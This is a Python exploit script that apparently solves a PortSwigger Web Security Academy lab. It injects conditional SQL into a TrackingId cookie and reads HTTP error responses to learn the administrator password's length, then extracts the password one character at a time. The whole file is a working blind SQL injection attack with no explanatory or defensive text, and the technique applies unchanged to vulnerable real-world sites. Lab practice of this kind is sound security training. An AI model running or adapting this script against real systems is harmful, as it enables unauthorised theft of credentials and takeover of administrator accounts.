import sys
import requests
import string
from requests.adapters import HTTPAdapter, Retry



def enumerate_password_length(url, session):
    password_length = 0
    for i in range(1, 50):
        payload = f"TrackingId=abc'||(SELECT CASE WHEN LENGTH(password)={i} THEN '' ELSE TO_CHAR(1/0) END FROM users WHERE username='administrator')||'"
        response = session.get(url, cookies={"TrackingId": payload})
        if response.status_code == 200:
            password_length = i
            break
    return password_length


def enumerate_password(url,session, length):
    alphanumeric_characters = string.ascii_lowercase + string.digits
    password = ""
    print("(+) Enumerating password...")
    for i in range(1, length + 1):
        for j in alphanumeric_characters:
            payload = f"abc'||(SELECT CASE WHEN SUBSTR(password,{i},1)='{j}' THEN '' ELSE TO_CHAR(1/0) END FROM users WHERE username='administrator')||'"
            response = session.get(url, cookies={"TrackingId": payload})
            if response.status_code == 200:
                password += j
                print("\r" + password, end="", flush=True)
                break
            else:
                print("\r" + password + j, end="", flush=True)



def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage: python3 {sys.argv[0]} <URL>")
        print(f"(+) Example: python3 {sys.argv[0]} https://0a54001c03544eff826c97940016002a.web-security-academy.net")
        sys.exit(1)

    url = sys.argv[1]
    session = requests.Session()
    session.mount("https://", HTTPAdapter(max_retries=Retry(total=3, backoff_factor=0.1)))

    print("(+) Enumerating password length... ")
    password_length = enumerate_password_length(url, session)
    print(f"(+) Password length: {password_length}")
    enumerate_password(url, session, password_length)
    print()


if __name__ == "__main__":
    main()
